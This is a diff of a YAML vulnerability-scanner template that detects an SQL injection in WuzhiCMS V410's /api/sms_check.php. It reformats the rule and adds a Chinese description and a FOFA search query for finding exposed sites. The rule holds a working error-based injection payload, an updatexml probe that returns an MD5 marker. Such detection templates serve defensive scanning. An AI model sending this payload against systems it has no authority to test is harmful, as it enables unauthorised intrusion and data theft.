@@ -1,15 +1,20 @@
 id: wuzhicms-v410-sqli
 
 info:
-    name: WuzhiCMS V410 sqli
-    author: leezp
-    severity: high
+  name: WuzhiCMS V410 sqli
+  author: leezp
+  severity: high
+  verified: false
+  description: |
+    WuzhiCMS V410 存在 SQL 注入漏洞，攻击者可以通过构造特殊的请求参数，在服务器上执行任意 SQL 语句。
+    fofa: app="WuzhiCMS"
+  tags: wuzhicms,sqli
+  created: 2025/03/13
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20
-        expression: response.status == 200 && response.body.bcontains(b"81dc9bdb52d04dc20036dbd8313ed05") && response.body.bcontains(b"sql_error:MySQL Query Error")
+  r0:
+    request:
+      method: GET
+      path: /api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20
+    expression: response.status == 200 && response.body.bcontains(b"81dc9bdb52d04dc20036dbd8313ed05") && response.body.bcontains(b"sql_error:MySQL Query Error")
 expression: r0()
-
